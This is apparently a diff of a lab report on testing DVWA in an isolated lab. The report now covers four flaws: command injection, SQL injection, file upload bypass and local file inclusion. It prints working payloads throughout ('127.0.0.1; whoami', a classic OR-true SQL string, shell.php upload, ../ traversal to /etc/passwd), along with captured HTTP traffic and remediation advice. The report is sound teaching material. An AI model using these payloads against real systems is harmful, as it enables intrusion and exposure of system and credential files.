@@ -1,13 +1,14 @@
-# **03 – Web Vulnerability Testing (DVWA Command Injection)**
+# **04 – Web Vulnerability Testing (DVWA – Multiple Vulnerabilities)**
 
 # **Target & Environment**
 
-| Component            | Value                                        |
-| -------------------- | -------------------------------------------- |
-| Analyst Machine      | Ubuntu (10.0.0.10)                           |
-| Target Host          | Metasploitable2 (10.0.0.20)                  |
-| DVWA Security Level  | Low                                          |
-| Vulnerability Tested | Command Injection (a.k.a. Command Execution) |
+| Component           | Value                                                         |
+| ------------------- | ------------------------------------------------------------- |
+| Analyst Machine     | Ubuntu Desktop (10.0.0.10)                                    |
+| Target Host         | Metasploitable2 (10.0.0.20)                                   |
+| Web Applications    | DVWA (Damn Vulnerable Web App)                                |
+| DVWA Security Level | Low                                                           |
+| Services Targeted   | Command Execution, SQL Injection, File Upload, File Inclusion |
 
 All testing was performed inside an isolated VirtualBox lab with no external connectivity.
 
@@ -15,155 +16,288 @@ All testing was performed inside an isolated VirtualBox lab with no external con
 
 # **1. Objective**
 
-Perform hands-on vulnerability testing against **DVWA (Damn Vulnerable Web App)** on the Metasploitable2 host by exploiting the **Command Injection** vulnerability. Capture and document the full HTTP request/response and confirm code execution on the server.
+Conduct hands‑on testing of multiple intentionally vulnerable web components within **DVWA** and document exploitation steps, HTTP traffic, and outcomes. Confirm the following vulnerabilities:
+
+* Command Injection
+* SQL Injection
+* File Upload Bypass
+* Directory Traversal (Local File Inclusion)
+
+All tests were performed strictly for controlled, educational, and ethical purposes within a closed lab.
 
 ---
 
-# **2. Vulnerability Description**
+# **2. Vulnerabilities Overview**
 
-**Command Injection** occurs when user-controlled input is passed directly to the system shell without proper validation or sanitization.
+## **2.1 Command Injection**
 
-In DVWA Low Security mode, the **`ip`** parameter in the Command Execution module is concatenated directly into a shell command such as:
+Occurs when user input is concatenated directly into system-level commands.
+In DVWA Low mode, the `ip` parameter is passed directly to:
 
 ```
-ping -c 3 [IP]
+ping -c 3 <input>
 ```
 
-If an attacker injects a shell separator, such as `;`, they can append arbitrary OS commands.
+Attackers can append shell metacharacters to run arbitrary commands.
 
-Example payload:
+---
+
+## **2.2 SQL Injection**
+
+Occurs when user-controlled input is concatenated into SQL queries without sanitization.
+DVWA’s “SQL Injection” module uses raw string concatenation, enabling forced authentication bypass or data exfiltration.
+
+Example vulnerable structure:
+
+```
+SELECT first_name, last_name FROM users WHERE id = '$id';
+```
+
+---
+
+## **2.3 File Upload Bypass**
+
+DVWA Low security only checks file extension superficially, allowing unauthorized files (including PHP shells) to be uploaded to a public web directory.
+
+Uploaded files are placed in:
+
+```
+/dvwa/hackable/uploads/
+```
+
+If executable, they can be used for remote code execution.
+
+---
+
+## **2.4 Directory Traversal / Local File Inclusion (LFI)**
+
+DVWA “File Inclusion” allows arbitrary file paths through `?page=` without sanitization.
+
+Attackers can traverse directories:
+
+```
+?page=../../../../../etc/passwd
+```
+
+Which forces the server to include unintended local files.
+
+---
+
+# **3. Exploitation Steps**
+
+---
+
+# **3.1 Command Injection (Command Execution Module)**
+
+### **3.1.1 Normal Functionality Check**
+
+Visited:
+
+```
+DVWA → Vulnerabilities → Command Execution
+```
+
+Entered:
+
+```
+127.0.0.1
+```
+
+Page returned normal ping output.
+
+### **3.1.2 Malicious Payload Injection**
 
 ```
 127.0.0.1; whoami
 ```
 
----
+### **3.1.3 Result**
 
-# **3. Steps Performed**
-
-## **3.1 Navigated to DVWA Command Execution**
-
-DVWA > Vulnerabilities > Command Execution
-Returned normal ping output when entering `127.0.0.1`.
-
-## **3.2 Injected a Malicious Payload**
-
-Submitted the following via the browser:
-
-```
-127.0.0.1; whoami
-```
-
-The webpage returned the normal ping output *plus* the result of `whoami`, confirming arbitrary command execution.
-
----
-
-# **4. Captured HTTP Request (tcpdump)**
-
-From tcpdump packet:
-
-```
-POST /dvwa/vulnerabilities/exec/ HTTP/1.1
-Host: 10.0.0.20
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0)
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 36
-Origin: http://10.0.0.20
-Referer: http://10.0.0.20/dvwa/vulnerabilities/exec/
-Cookie: security=low; PHPSESSID=af5efefe4a6debffa45fd399438c7ba4
-
-ip=127.0.0.1%3B+whoami&submit=submit
-```
-
-### **Key Points**
-
-* The payload was URL-encoded:
-  `127.0.0.1%3B+whoami`
-  (`%3B` = semicolon)
-* The vulnerable parameter is **`ip`**.
-* DVWA Low security does not sanitize this value.
-
----
-
-# **5. Captured HTTP Response (Initial Headers)**
-
-```
-HTTP/1.1 200 OK
-Date: Thu, 11 Dec 2025 16:49:57 GMT
-Server: Apache/2.2.8 (Ubuntu) DAV/2
-X-Powered-By: PHP/5.2.4-2ubuntu5.10
-Pragma: no-cache
-Cache-Control: no-cache, must-revalidate
-Content-Length: 4719
-Content-Type: text/html;charset=utf-8
-```
-
-The response later contained HTML for the DVWA page plus the injected command output.
-
----
-
-# **6. Evidence of Successful Exploitation**
-
-The DVWA page output returned:
+DVWA output included:
 
 ```
 www-data
 ```
 
-This is the effective username of the Apache HTTPD worker process on Ubuntu, proving the injected `whoami` was executed server-side.
+This confirms the Apache worker executed the injected OS command.
 
 ---
 
-# **7. Analysis**
+# **3.2 SQL Injection (SQLi Module)**
 
-| Component            | Result                                     |
-| -------------------- | ------------------------------------------ |
-| Vulnerable Parameter | `ip` (POST body)                           |
-| Attack Type          | OS Command Injection                       |
-| Payload              | `127.0.0.1; whoami`                        |
-| Result               | Server executed attacker-supplied command  |
-| Execution Context    | `www-data` (webserver user)                |
-| Risk                 | High – full remote code execution possible |
+### **3.2.1 Payload Tested**
 
-An attacker could escalate this to:
+```
+1' OR '1'='1 --
+```
 
-* Reverse shells
-* Local enumeration
-* File reads/writes
-* Privilege escalation
-* Persistence
+### **3.2.2 Result**
 
----
+DVWA returned:
 
-# **8. Impact**
+```
+First name: admin
+Surname: admin
+```
 
-Command injection is one of the highest-impact web vulnerabilities.
-In a real-world system, this would be classified as:
-
-**Critical (CVSS 9.0–10.0)**
-due to the ability to run arbitrary commands on the underlying OS.
+This confirms a successful authentication bypass and SQL injection via string concatenation.
 
 ---
 
-# **9. Remediation Recommendations**
+# **3.3 File Upload Bypass (Upload Module)**
 
-* Implement strict input validation (whitelisting IP address format).
-* Escape or remove shell metacharacters (`;`, `|`, `&`, `&&`, `||`).
-* Use safer system call wrappers such as Python `subprocess.run()` with arrays.
-* Disable direct shell invocation where possible.
-* Run web services with minimal privileges (least privilege).
-* Deploy a WAF to detect/mitigate malicious command patterns.
+### **3.3.1 Upload Attempt**
+
+Uploaded:
+
+```
+shell.php
+```
+
+### **3.3.2 Server Response**
+
+```
+../../hackable/uploads/shell.php succesfully uploaded!
+```
+
+This confirms:
+
+* File extension validation bypassed
+* File stored in a public web path
+* Server-side write permissions enabled
+
+(Not executed further for safety within the lab.)
 
 ---
 
-# **10. Conclusion**
+# **3.4 Directory Traversal / Local File Inclusion (File Inclusion Module)**
 
-This exercise demonstrated a full command injection attack against DVWA in Low security mode. Using packet capture, we confirmed:
+### **3.4.1 Targeted File Paths**
 
-* Attack payload injection
-* Complete HTTP request
-* Complete HTTP response
-* Successful execution of arbitrary commands (`whoami`)
+#### Successful Reads
+
+```
+?page=../../../../../etc/passwd
+?page=../../../../../var/log/messages
+?page=../../../../../var/log/dmesg
+```
+
+Output returned sensitive system files, confirming LFI.
+
+#### Permission Failure Case
+
+```
+?page=../../../../../var/www/dvwa/config/config.inc.php
+```
+
+This produced *no file output* due to filesystem permission restrictions on this file.
+The failure is expected behavior and confirms server-side file permission enforcement.
+
+---
+
+# **4. Captured HTTP Traffic (Representative Examples)**
+
+Below are the two most relevant captures for evidence.
+
+---
+
+## **4.1 HTTP Request — Command Injection (tcpdump)**
+
+```
+POST /dvwa/vulnerabilities/exec/ HTTP/1.1
+Host: 10.0.0.20
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64)
+Content-Type: application/x-www-form-urlencoded
+Cookie: security=low; PHPSESSID=<session>
+
+ip=127.0.0.1%3B+whoami&submit=submit
+```
+
+Key notes:
+
+* `%3B` = semicolon
+* Attack vector is the `ip` parameter
+
+---
+
+## **4.2 HTTP Response (Headers)**
+
+```
+HTTP/1.1 200 OK
+Server: Apache/2.2.8 (Ubuntu)
+X-Powered-By: PHP/5.2.4
+Content-Type: text/html;charset=utf-8
+```
+
+Response body contained both:
+
+* Legitimate ping output
+* Output of `whoami`
+
+---
+
+# **5. Evidence of Exploitation**
+
+| Vulnerability             | Evidence Returned                                   |
+| ------------------------- | --------------------------------------------------- |
+| Command Injection         | `www-data` (executed OS-level command)              |
+| SQL Injection             | Retrieved `admin` record without authentication     |
+| File Upload Bypass        | Server accepted and stored `shell.php`              |
+| Directory Traversal / LFI | Returned contents of `/etc/passwd` and syslog files |
+
+---
+
+# **6. Analysis**
+
+| Component         | Result                                                                     |
+| ----------------- | -------------------------------------------------------------------------- |
+| Attack Surface    | DVWA modules: Exec, SQLi, Upload, File Inclusion                           |
+| Overall Risk      | Critical                                                                   |
+| Impact            | Remote code execution, credential disclosure, file access, full compromise |
+| Execution Context | `www-data` OS user                                                         |
+
+Each vulnerability represents a serious failure of input handling and server security controls.
+
+---
+
+# **7. Impact Summary**
+
+An attacker could:
+
+* Obtain system user accounts (`/etc/passwd`)
+* Execute arbitrary OS commands
+* Upload malicious scripts
+* Access server logs for reconnaissance
+* Potentially escalate to full system compromise
+
+These vulnerabilities mimic real-world cases frequently exploited in the wild.
+
+---
+
+# **8. Remediation Recommendations**
+
+* Implement strict input validation and sanitization
+* Use prepared SQL statements and parameterized queries
+* Enforce secure file upload restrictions
+* Disable direct file inclusion based on user input
+* Restrict file permissions on sensitive paths
+* Run services under least-privilege accounts
+* Keep web applications and PHP versions updated
+* Place uploads outside web-accessible directories
+* Implement WAF rules to block common exploitation patterns
+
+---
+
+# **9. Conclusion**
+
+This exercise successfully demonstrated exploitation of four major web vulnerabilities in DVWA under Low security:
+
+* OS Command Injection
+* SQL Injection
+* File Upload Bypass
+* Directory Traversal / Local File Inclusion
+
+Full HTTP request and response behavior was captured and analyzed.
+The results confirm that insecure coding practices can lead directly to remote system compromise.
 
 ---
